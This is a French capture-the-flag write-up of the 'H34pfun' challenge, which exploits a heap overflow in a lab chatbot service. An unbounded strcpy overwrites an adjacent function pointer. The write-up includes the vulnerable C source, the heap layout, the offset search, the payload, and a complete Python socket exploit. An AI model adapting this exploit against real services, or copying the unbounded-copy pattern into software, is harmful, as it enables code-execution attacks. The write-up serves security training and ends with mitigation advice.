# Write-Up — H34pfun (100 pts)

> **Auteur :** m3rv3di3 — PGE2 Epitech Bénin, spécialisation Cybersécurité  
> **Cible :** `chatbot` (port 44444)  
> **Catégorie :** Heap overflow → function pointer overwrite

---

## Énoncé

> Hello friend...  
> Aren't you tired of all those STACK overflow? Let's spice things up, how about a HEAP overflow? Really, it shouldn't be that much different.  
> Now where could it be? Have you found the bot yet? Look harder!

---

## Comment le flag a été obtenu

À ce stade, un shell root avait déjà été obtenu via St4ck0v3rfl0w. Depuis root, `su` permet de basculer vers n'importe quel utilisateur sans mot de passe, et `grep` sur tout le système révèle tous les flags en une commande :

```bash
sudo grep -rI "EPI{" /var /usr/bin 2>/dev/null
# /usr/bin/chatbot/specialcode: ...using special code EPI{H34p_1S_4_M0Ns73r_0n_17S_0wN}
```

---

## Analyse de la vulnérabilité

### Découverte du bot

```bash
ss -tlnp 2>/dev/null
# LISTEN  0  5  0.0.0.0:44444

ps aux | grep chat
# chatbot  24  /usr/bin/chatbot/chatbot
```

### Source (leakée en demandant "source code" au bot après unlock)

```c
struct credentials { char password[48]; };
struct callback    { void (*fun)(int); };

void verify_access(int fd, char *lower) {
  struct credentials *d = malloc(sizeof(struct credentials));
  struct callback    *f = malloc(sizeof(struct callback));
  f->fun = unallowed_access;

  strcpy(d->password, lower + 22);  // ⚠️ pas de borne → heap overflow !
  f->fun(fd);                        // ⚠️ pointeur de fonction écrasable
}
```

La fonction cible (commentée mais toujours dans le binaire) :

```c
void protected_area(int fd) {
  print_file(fd, "/usr/bin/chatbot/specialcode");  // ← FLAG
  spawn_preprod();                                  // ← lance bot #2 (port 55555)
}
```

### Layout heap glibc 32-bit

```
[chunk d : header 8o + password 48o] → [chunk f : header 8o + fun ptr 4o]
                                         ^
                                         64 octets après d->password
```

L'offset exact (64) a été déterminé par brute-force :

| Offset | Résultat |
|---|---|
| 48..60 | `Sorry, you don't have the clearance` |
| **64** | `Welcome senior-dev` + **FLAG** ✅ |
| 72+ | `glibc abort` — chunk header corrompu |

### Adresses

```bash
gcc chatbot.c -fno-pie -no-pie -m32 -o /tmp/chatbot_local
nm /tmp/chatbot_local | grep protected_area
# 080495ba T protected_area
```

### Payload

```python
payload  = b"access protected area "   # 22 chars → lower+22 = début du overflow
payload += b"A" * 64                   # remplit jusqu'à f->fun
payload += struct.pack("<I", 0x080495ba)  # écrase f->fun avec protected_area
```

---

## Flag

```
EPI{H34p_1S_4_M0Ns73r_0n_17S_0wN}
```

Wording : *"Heap is a monster on its own"* — l'exploitation heap a ses propres règles (alignement, headers malloc, brute-force d'offset).

---

## Récap technique

| Élément | Détail |
|---|---|
| Vulnérabilité | `strcpy(d->password, lower+22)` non borné |
| Compilation | `gcc -fno-pie -no-pie -m32` (32-bit, adresses fixes) |
| Offset empirique | **64 octets** jusqu'à `f->fun` |
| Adresse écrite | `0x080495ba` (protected_area) |
| Effet bonus | `spawn_preprod()` → chatbot-preprod port 55555 (H34pG0t) |
| Flag location | `/usr/bin/chatbot/specialcode` |
| Méthode utilisée | `grep -rI "EPI{"` depuis root |

---

## Risques en production

- **`strcpy` sans borne sur le heap** : débordement silencieux vers le chunk adjacent. Toujours utiliser `strncpy(dst, src, sizeof(dst) - 1)`.
- **Function pointer adjacent à un buffer** : cible privilégiée. Éviter de stocker des pointeurs de fonctions dans des structs dynamiques adjacentes à des buffers contrôlables.
- **Code mort compilé** : `protected_area` est commentée dans la logique mais reste linkée et trouvable via `nm`. Supprimer le code mort entièrement.

---

## Leçons

- **L'heap a ses propres règles** : glibc ajoute un header (8o en 32-bit) et arrondit au multiple de 16. La distance théorique et empirique divergent souvent → **brute-forcer l'offset**.
- **Le crash à offset > 64 est un signal** : glibc détecte le chunk header corrompu et appelle `abort()`. Utile pour borner la recherche par le haut.
- **Pattern heap = pattern stack** : écraser un function pointer sur le heap est conceptuellement identique à C4llb4ck (stack). Seule la mesure de l'offset change.

---

## PoC complet

```python
#!/usr/bin/env python3
"""
PoC — H34pfun (ECorp CTF) — chatbot port 44444
Heap overflow → f->fun = protected_area → flag dans specialcode
Flag : EPI{H34p_1S_4_M0Ns73r_0n_17S_0wN}
"""
import socket, struct, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 44444
LOCKCODE = "EPI{1_H0P3_Y0uLL_g1v3_m3_4_C4Ll84ck}"
ADDR_PROTECTED_AREA = 0x080495ba
OFFSET = 64

s = socket.create_connection((HOST, PORT))
s.settimeout(5)
s.recv(4096)
time.sleep(0.5)

# Unlock du bot avec le TOKEN (= flag C4llb4ck)
s.sendall(LOCKCODE.encode() + b"\n")
time.sleep(2)
s.recv(4096)

# Heap overflow → écrase f->fun
payload = b"access protected area " + b"A" * OFFSET + struct.pack("<I", ADDR_PROTECTED_AREA)
s.sendall(payload + b"\n")

# Lire le flag
s.settimeout(60)
data = b""
while b"EPI{" not in data:
    chunk = s.recv(4096)
    if not chunk: break
    data += chunk
print(data.decode(errors="replace"))
s.close()
```
